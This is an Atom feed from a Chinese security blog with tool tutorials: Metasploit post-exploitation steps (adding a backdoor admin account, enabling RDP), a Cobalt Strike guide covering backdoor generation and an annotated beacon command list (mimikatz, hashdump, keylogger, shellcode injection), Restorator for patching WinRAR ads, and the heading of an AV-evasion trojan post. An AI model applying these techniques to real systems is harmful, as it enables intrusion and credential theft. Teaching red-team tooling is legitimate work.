<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>梦~醒🥝</title>
  
  
  <link href="https://example.com/atom.xml" rel="self"/>
  
  <link href="https://example.com/"/>
  <updated>2024-12-01T16:06:22.834Z</updated>
  <id>https://example.com/</id>
  
  <author>
    <name>梦~醒🥝</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>kali中metasploit使用</title>
    <link href="https://example.com/posts/9375d9ee.html"/>
    <id>https://example.com/posts/9375d9ee.html</id>
    <published>2024-12-01T16:03:08.940Z</published>
    <updated>2024-12-01T16:06:22.834Z</updated>
    
    <content type="html"><![CDATA[<h1 id="kali中metasploit使用"><a href="#kali中metasploit使用" class="headerlink" title="kali中metasploit使用"></a>kali中metasploit使用</h1><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1e872c4cd10f79a63d862c2e8076cf90.jpg" alt=""></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/62577fd08549538e7954aa69fc08e8c5.jpg" alt=""></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/4a4f354e8700b71e6a64bbacf835665f.jpg" alt=""></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/03c79ac5eb64fafc8039b2073510fe97.jpg" alt=""></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/22fb34311121e723024aef8d4770b853.jpg" alt=""></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0bd2074ec17321ee3ff23e228b564694.jpg" alt=""></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/8fd0c7c69790abc63539f79b0f4fa84c.jpg" alt=""></p><blockquote><p>shell命令会开启目标机的cmd控制台，打开了这个就相当于可以执行任何命令。</p></blockquote><p><strong>打进去后，进行远程桌面连接的注意事项：</strong></p><p><strong>1.创建用户：net user username password /add</strong></p><p><strong>2.赋予用户管理员权限：net localgroup group_name UserLoginName /add</strong></p><p><strong>3.没有赋予管理员权限远程桌面连接是会失败的。</strong></p><p><strong>4.win7不能同时登陆一个账户，比如目标机登录了一个账户，攻击者在进行远程登录桌面时会把目标机顶下去。</strong></p><p><strong>一些注意事项：</strong></p><p><strong>1.run后报错Host does NOT appear vulnerable.：说明靶机打了补丁的，修复了永恒之蓝漏洞（补丁：KB4474419），删除就可以了。</strong></p><p><strong>2.run getgui -e报错：换成 run post/windows/manage/enable_rdp即可</strong></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/8b320bd4fb77b7538bc5d6fab277b5fc.jpg" alt=""></p>]]></content>
    
    
    <summary type="html">🥧kali中metasploit使用</summary>
    
    
    
    <category term="web渗透" scheme="https://example.com/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="工具使用" scheme="https://example.com/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>CobaltStrike4.8汉化版带插件使用方法</title>
    <link href="https://example.com/posts/4aeca11a.html"/>
    <id>https://example.com/posts/4aeca11a.html</id>
    <published>2024-12-01T16:03:08.938Z</published>
    <updated>2024-12-01T16:06:22.832Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CobaltStrike4-8汉化版带插件使用方法"><a href="#CobaltStrike4-8汉化版带插件使用方法" class="headerlink" title="CobaltStrike4.8汉化版带插件使用方法"></a>CobaltStrike4.8汉化版带插件使用方法</h1><p>使用大致流程<br>创建团队服务器-&gt;客户端连接服务器-&gt;创建监听器-&gt;生成后门对应监听器-&gt;靶机运行后门成功上线-&gt;后渗透（提权，内网漫游，域渗透等）</p><h2 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h2><p><img src="https://i-blog.csdnimg.cn/blog_migrate/fd8da35e28b5c9bc7b8132070b54a3c7.png" alt="在这里插入图片描述"><br>把全部文件下上传到外网VPS上，并给足权限<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1d68638ddd135505086d548f1c394c61.png" alt="在这里插入图片描述"><br>服务端运行起来<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/eff03a78ec9383205a4be2c0f9c6effc.png" alt="在这里插入图片描述"></p><p>本地电脑使用<a href="https://so.csdn.net/so/search?q=客户端&amp;spm=1001.2101.3001.7020">客户端</a>连接即可<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/6dad38954540036b265ccfa25241ffe7.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2f791f60db73100ac4a92527dce51fe9.png" alt="在这里插入图片描述"><br>主要输入<code>HOST、Port、password</code>即可</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/bb05f44ff7b7c4ec14c9563d55efb2d3.png" alt="在这里插入图片描述"></p><h2 id="二、上线"><a href="#二、上线" class="headerlink" title="二、上线"></a>二、上线</h2><h3 id="1、设置监听器"><a href="#1、设置监听器" class="headerlink" title="1、设置监听器"></a>1、设置监听器</h3><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/e1a94fb37712fac9533688c672ea9028.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/b8c145b86c42438ac11b4b3350b249e9.png" alt="在这里插入图片描述"></p><h3 id="2、生成木马后门"><a href="#2、生成木马后门" class="headerlink" title="2、生成木马后门"></a>2、生成木马后门</h3><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/56362e228cba526ec1c3ca073c78d34c.png" alt="在这里插入图片描述"></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/90ad2a56214be9a95dad682bd75de839.png" alt="在这里插入图片描述"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/006995bcb55100b36211940a6e3fb6f0.png" alt="在这里插入图片描述"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/d2a9e1f98caa9d8913a74c34750058a5.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/59550d2c11e32bc849fd98fb2e140011.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/19fe4aeb1089455d9cd7935350e4a682.png" alt="在这里插入图片描述"><br>运行即可上线CS<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/4dffee027c99823dac41e8f4baf87f5f.png" alt="在这里插入图片描述"></p><p>3、指令大全</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">browserpivot 注入受害者浏览器进程</span><br><span class="line"><span class="built_in">sleep</span> <span class="number">3</span> 全部命令<span class="number">3</span>秒执行</span><br><span class="line">bypassuac 绕过UAC</span><br><span class="line">cancel 取消正在进行的下载</span><br><span class="line">cd 切换目录</span><br><span class="line">checkin 强制让被控端回连一次</span><br><span class="line">clear 清除beacon内部的任务队列</span><br><span class="line">connect Connect to a Beacon peerover TCP</span><br><span class="line">covertvpn 部署Covert VPN客户端</span><br><span class="line">cp 复制文件</span><br><span class="line">dcsync 从DC中提取密码哈希</span><br><span class="line">desktop 远程VNC</span><br><span class="line">dllinject 反射DLL注入进程</span><br><span class="line">dllload 使用LoadLibrary将DLL加载到进程中</span><br><span class="line">download 下载文件</span><br><span class="line">downloads 列出正在进行的文件下载</span><br><span class="line">drives 列出目标盘符</span><br><span class="line">elevate 尝试提权</span><br><span class="line">execute 在目标上执行程序(无输出)</span><br><span class="line">execute-assembly 在目标上内存中执行本地.NET程序</span><br><span class="line">exit 退出beacon</span><br><span class="line">getprivs Enable <span class="keyword">system</span> privileges oncurrent token</span><br><span class="line">getsystem 尝试获取<span class="keyword">SYSTEM</span>权限</span><br><span class="line">getuid 获取用户ID</span><br><span class="line">hashdump 转储密码哈希值</span><br><span class="line">help 帮助</span><br><span class="line">inject 在特定进程中生成会话</span><br><span class="line"><span class="built_in">jobkill</span> 杀死一个后台任务</span><br><span class="line">jobs 列出后台任务</span><br><span class="line">kerberos_ccache_use 从ccache文件中导入票据应用于此会话</span><br><span class="line">kerberos_ticket_purge 清除当前会话的票据</span><br><span class="line">kerberos_ticket_use 从ticket文件中导入票据应用于此会话</span><br><span class="line">keylogger 键盘记录</span><br><span class="line">kill 结束进程</span><br><span class="line">link Connect to a Beacon peerover a named pipe</span><br><span class="line">logonpasswords 使用mimikatz转储凭据和哈希值</span><br><span class="line">ls 列出文件</span><br><span class="line">make_token 创建令牌以传递凭据</span><br><span class="line">mimikatz 运行mimikatz</span><br><span class="line">mkdir 创建一个目录</span><br><span class="line">mode dns 使用DNS A作为通信通道(仅限DNS beacon)</span><br><span class="line">mode dns-txt 使用DNS TXT作为通信通道(仅限D beacon)</span><br><span class="line">mode dns6 使用DNS AAAA作为通信通道(仅限DNS beacon)</span><br><span class="line">mode http 使用HTTP作为通信通道</span><br><span class="line">mv 移动文件</span><br><span class="line">net net命令</span><br><span class="line">note 备注</span><br><span class="line">portscan 进行端口扫描</span><br><span class="line">powerpick 通过Unmanaged PowerShell执行命令</span><br><span class="line">powershell 通过powershell.exe执行命令</span><br><span class="line">powershell-import 导入powershell脚本</span><br><span class="line">ppid <span class="keyword">Set</span> parent <span class="comment">PID forspawned post-ex jobs</span></span><br><span class="line">ps 显示进程列表</span><br><span class="line">psexec <span class="comment">Use a service to spawn asession on a host</span></span><br><span class="line">psexec_psh <span class="comment">Use PowerShell to spawn asession on a host</span></span><br><span class="line">psinject 在特定进程中执行<span class="comment">PowerShell</span>命令</span><br><span class="line">pth 使用<span class="comment">Mimikatz</span>进行传递哈希</span><br><span class="line">pwd 当前目录位置</span><br><span class="line">reg <span class="comment">Query the registry</span></span><br><span class="line">rev2self 恢复原始令牌</span><br><span class="line">rm 删除文件或文件夹</span><br><span class="line">rportfwd 端口转发</span><br><span class="line">run 在目标上执行程序<span class="comment">(</span>返回输出<span class="comment">)</span></span><br><span class="line">runas 以另一个用户权限执行程序</span><br><span class="line">runasadmin 在高权限下执行程序</span><br><span class="line">runu <span class="comment">Execute a program underanother PID</span></span><br><span class="line">screenshot 屏幕截图</span><br><span class="line">setenv 设置环境变量</span><br><span class="line">shell <span class="comment">cmd.exe</span>  打开<span class="comment">cmd</span>终端</span><br><span class="line">shell <span class="comment">ipconfig</span> 执行<span class="comment">ipconfig</span>命令</span><br><span class="line">shinject 将<span class="comment">shellcode</span>注入进程</span><br><span class="line">shspawn 生成进程并将<span class="comment">shellcode</span>注入其中</span><br><span class="line">sleep 设置睡眠延迟时间</span><br><span class="line">socks 启动<span class="comment">SOCKS4</span>代理</span><br><span class="line">socks <span class="comment">stop</span> 停止<span class="comment">SOCKS4</span></span><br><span class="line">spawn <span class="comment">Spawn a session</span></span><br><span class="line">spawnas <span class="comment">Spawn a session as anotheruser</span></span><br><span class="line">spawnto <span class="comment">Set executable tospawn processes into</span></span><br><span class="line">spawnu <span class="comment">Spawn a session underanother PID</span></span><br><span class="line">ssh 使用<span class="comment">ssh</span>连接远程主机</span><br><span class="line">ssh-key 使用密钥连接远程主机</span><br><span class="line">steal_token 从进程中窃取令牌</span><br><span class="line">timestomp 将一个文件时间戳应用到另一个文件</span><br><span class="line">unlink <span class="comment">Disconnect from parentBeacon</span></span><br><span class="line">upload 上传文件</span><br><span class="line">wdigest 使用<span class="comment">mimikatz</span>转储明文凭据</span><br><span class="line">winrm 使用<span class="comment">WinRM</span>在主机上生成会话</span><br><span class="line">wmi 使用<span class="comment">WMI</span>在主机上生成会话</span><br><span class="line">argue 进程参数欺骗</span><br></pre></td></tr></table></figure><p>简单执行命令<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/289671437f709365de5a2814c404276a.png" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sleep</span> 3 全部命令3秒执行(默认时60秒太长，)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/70585c627c2b72b05a8327148763c874.png" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">执行系统命令要在命令前加个shell <span class="built_in">whoami</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/f19e237d101f5d2af4c7711ed17dfa1d.png" alt="在这里插入图片描述"></p><h2 id="三、如何加载插件及EXE？"><a href="#三、如何加载插件及EXE？" class="headerlink" title="三、如何加载插件及EXE？"></a>三、如何加载插件及EXE？</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/21e95c67f6a2dd9b78413dd1dea0a43e.png" alt="在这里插入图片描述"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/a608b591991be7e7e89b5c3bb984f4b0.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/f1efc47dcc28d2fbb0b79071e12f9baf.png" alt="在这里插入图片描述"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/9dc44ed86a5a91ea6ba0d969e4082ff3.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/8d62307548f725b99ad73a81ca39315b.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/fd4168389490b83b43a09c7ca5be69d5.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1f8e05004bd2fa94737dad28ab5d5c60.png" alt="在这里插入图片描述"><br><strong>如果不想加载插件想直接上传成品exe文件也是可以的</strong><br>Ladon插件/工具体积小、免杀<br><a href="https://github.com/k8gege/Ladon">https://github.com/k8gege/Ladon</a></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/7040b73f54481840d89d14852e65f8f7.png" alt="在这里插入图片描述"><br>可以利用CS自身文件上传功能上传成品的exe或者直接使用插件<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2c0d3ecca0022bd64564630526353b06.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/d0e664b3ab32c9f82cc3418f1ced1da5.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/dfb7e88979435b5388d14be7384a98a0.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/99cb7148de4fcebe8dec9b12715c3924.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1cac18e081c12f9b1ebb46bd8ae65368.png" alt="在这里插入图片描述"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/02a3a3e8122eb70a4b749a633105c78b.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/ac9b3c70920e1ac1babff556af996d4a.png" alt="在这里插入图片描述"></p><p>四、联动MSF<br>1、CS-&gt;MSF(CS把权限转交给MSF)</p><p><strong>CS：</strong><br>新建个监听器（监听的协议要与MSF一致，这里监听HTTP协议，那么MSF也要监听HTTP协议）<br>CS监听的协议是windows/foreign/reverse_http字样</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/9f6954a480ba11e21ac47978802618f5.png" alt="在这里插入图片描述"></p><p>spawn msf （要联动的会话上执行该命令）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/751a23740a2febd0a0ed150344224f4e.png" alt="在这里插入图片描述"></p>]]></content>
    
    
    <summary type="html">🥧CobaltStrike4.8汉化版带插件使用方法</summary>
    
    
    
    <category term="web渗透" scheme="https://example.com/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="工具使用" scheme="https://example.com/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>Restorator常见使用方法</title>
    <link href="https://example.com/posts/1586e22.html"/>
    <id>https://example.com/posts/1586e22.html</id>
    <published>2024-12-01T16:03:08.936Z</published>
    <updated>2024-12-01T16:06:22.833Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Restorator常见使用方法有哪些？"><a href="#Restorator常见使用方法有哪些？" class="headerlink" title="Restorator常见使用方法有哪些？"></a>Restorator常见使用方法有哪些？</h2><h3 id="案例一：解决WinRAR弹出广告"><a href="#案例一：解决WinRAR弹出广告" class="headerlink" title="案例一：解决WinRAR弹出广告"></a>案例一：解决WinRAR弹出广告</h3><h4 id="1、导出rc文件"><a href="#1、导出rc文件" class="headerlink" title="1、导出rc文件"></a>1、导出rc文件</h4><p>WinRAR安装完成后，用Restorator 2018打开安装目录WinRAR.exe。点开“打开”对话框后，通过WinRAR的安装路径，找到这个exe程序，然后点击“打开”。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132703168905322378488.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第2张"></p><p>Restorator 2018界面主要分为左右两个区，左边是资源树，我们点击“字符串”左边的加号，在展开的项目中，右键点击“中文”，然后选择“导出”→“导出为.rc”，保存到桌面：</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132703168905322323484.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第3张"></p><h4 id="2、打开rc文件"><a href="#2、打开rc文件" class="headerlink" title="2、打开rc文件"></a>2、打开rc文件</h4><p>上一步会导出一个.rc后缀的文件到指定位置。这一步我们去找到这个文件。如下图所示，我将导出的文件命名为“WinRAR导出分析-中文(简体，中-国).rc”，找到它，右键点开菜单后选择“打开方式”，然后用记事本的方式打开它也可以用文本编辑工具（<a href="https://www.lw50.com/post/notepadv85.html">notepad++</a>）修改：</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132704168905322441114.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第4张"></p><p>注意选择用记事本打开这个.rc文件时，不要勾选“始终用此应用打开.rc文件”。</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132704168905322414576.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第5张"></p><h4 id="3、定位弹广代码"><a href="#3、定位弹广代码" class="headerlink" title="3、定位弹广代码"></a>3、定位弹广代码</h4><p>这一步很关键。下图就是用记事本打开.rc文件的样子，可以看到每一行都有个序数，后面引号里是一个可执行操作的名字。我们需要找到有关弹窗广告的代码，并用合适的方式覆盖它。</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132704168905322461116.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第6张"></p><p>由于WinRAR在不停的更新中，所有新老版本的WinRAR将会有区别。我的WinRAR版本为中文版6.02，涉及弹窗的代码在第1277行。如果你用的WinRAR是其他版本，有可能不是第1277行，但是大致也跑不了1000~1300之间，特征是前后都一、两条网址。由于这个代码行，相对于其他中文还是很明显的，仔细找一下并不是很麻烦。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132704168905322468893.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第7张"></p><h4 id="4、覆盖弹广代码"><a href="#4、覆盖弹广代码" class="headerlink" title="4、覆盖弹广代码"></a>4、覆盖弹广代码</h4><p>找到弹窗代码后删除，改为</p><blockquote><p>“Reminder dialog information”</p></blockquote><p>注意：要保留引号，逗号等等，格式要与之前保持一致，避免马虎。改好之后，左上菜单选择“文件”→“另存为”，将这个.rc文件保存。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132705168905322511535.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第8张"></p><h4 id="5、导入已保存的-rc文件"><a href="#5、导入已保存的-rc文件" class="headerlink" title="5、导入已保存的.rc文件"></a>5、导入已保存的.rc文件</h4><p>这一步，我们把刚才已保存的.rc文件导入到Restorator 2018。操作与之前类似，先在左侧资源树点“+”展开“字符串”，然后右键点击“中文(xxx)”，菜单中选择“导入”→“导入…”。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132705168905322575625.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第9张"></p><p>打开刚才保存的.rc文件：</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132705168905322566301.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第10张"></p><p>此时可以看到Restorator 2018右侧的查看器内，已经是之前.rc的新内容（第1277行代码已经被覆盖），接下来选择“文件”→“另存为”，</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132706168905322653221.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第11张"></p><p>另存为一个新的exe文件：</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132706168905322642506.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第12张"></p><h4 id="6、覆盖源WinRAR-exe文件"><a href="#6、覆盖源WinRAR-exe文件" class="headerlink" title="6、覆盖源WinRAR.exe文件"></a>6、覆盖源WinRAR.exe文件</h4><p>接下来，我们把这个新WinRAR.exe，粘贴到WinRAR目录，覆盖原安装目录exe同名程序即可大功告成！</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132706168905322630189.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第13张"></p><p>好啦，现在你再启动WinRAR！再也没有弹窗广告了！</p><h3 id="案例二：修改软件标题"><a href="#案例二：修改软件标题" class="headerlink" title="案例二：修改软件标题"></a>案例二：修改软件标题</h3><p>1、首先载入我们需要修改的软件：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132708168905322863622.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第14张"></p><p>2、先更改成“编辑模式”。方法：单机“查看器”——“编辑模式”即可：</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132709168905322970763.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第15张"></p><p>3、在“资源树”里找到“对话框”——“101”，在右侧“标题”修改你希望看到的软件标题栏显示内容。中间的“资源查看器”会有预览。效果图如下：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132715168905323546042.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第16张"></p><p>4、然后在“资源树”里找到“对话框”——“112”这一项。我们只需单击我们想改的文字，在右侧“标题”下方修改即可：</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132717168905323752094.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第17张"></p><p>5、修改完成后的效果如下：</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132725168905324596468.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第18张"></p><p>6、然后就是修改图标。这里拿logo来演示！ico图标分辨率为32x32：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132726168905324639140.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第19张"></p><p>7、“资源树”——“图标”——“105”，右击“105”——“导入”——“导入到”，把ZOL导入；接着用同样的方法把图标导入到“108”中：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132731168905325163742.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第20张"></p><p>8、单击查看效果如何：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132733168905325316894.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第21张"></p><p>9、在“资源树”里找到“版本”项：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132735168905325574811.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第22张"></p><p>10、右下方就是我们要修改的内容了。可以把自己的个人信息都写进去：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132737168905325796822.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第23张"></p><h3 id="案例三：修改软件图标"><a href="#案例三：修改软件图标" class="headerlink" title="案例三：修改软件图标"></a>案例三：修改软件图标</h3><p>1、进去主界面后，如果需要填写注册码，打开“汉化说明”这个文本特别信息中的就是注册码。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132741168905326172413.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第24张"></p><p>2、打开你要修改的文件。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132742168905326273146.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第25张"></p><p>3、打开文件后，左侧资源树点击（红1）小三角拉开，把图标项也拉开（红2），现在看到（红3）的是该文件的包含的所有ICON，选中后可以看到图标的信息。</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132744168905326485900.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第26张"></p><p>4、选中图标_5000，可以在资源查看器看到ICON的信息（红1），可以看出来这个文件的图标格式是比较多的，往下拉（红2）就可以看到RGB/A的图像信息，目前看到的是16色信息。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132745168905326538644.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第27张"></p><p>5、256<em>128</em>96<em>64</em>48<em>32</em>24<em>16-RGB/A、256</em>128<em>96</em>64<em>48</em>32<em>24</em>16-256色、256<em>128</em>96<em>64</em>48<em>32</em>24*16-16色以上是图标项-5000图像信息，替换新的ICON进来时请确保图标信息要和原来的格式/数量一致！</p><p>6、为了达到安全稳定的使用效果，请逐个检查你将要选择替换的ICON项的格式和数量，确保替换一致。</p><p>7、请将你要替换的ico全部放到同一个文件夹里面，并对应图标在应用文件里面的编号（红1），比如：5000对应的是安全，5004对应的是防火墙……（红2）这里是文件游览器，方便我们查看要替换用的ICON。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132746168905326653562.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第28张"></p><p>8、将你要替换的图标整理到同一个文件夹下，然后用文件游览器找到并进入（红2），直到看到所有已经编号好的图标（红1）。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132748168905326864697.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第29张"></p><p>9、如果你的准备工作做好了，我们就要开始批量替换图标了。</p><p>10、右键左边资源树的图标项（文件夹图标），选择导入(O)，点击自动导入所有”图标”类型(Z)</p><p>11、导入完后，直接按F12另存为，保存完成了！</p>]]></content>
    
    
    <summary type="html">🥧Restorator常见使用方法</summary>
    
    
    
    <category term="web渗透" scheme="https://example.com/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="工具使用" scheme="https://example.com/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>免杀木马+文件捆绑+权限伪装</title>
    <link href="https://example.com/posts/1bec3970.html"/>
    <id>https://example.com/posts/1bec3970.html</id>
    <published>2024-12-01T15:29:21.152Z</published>
    <updated>2024-12-01T16:06:22.831Z</updated>
    
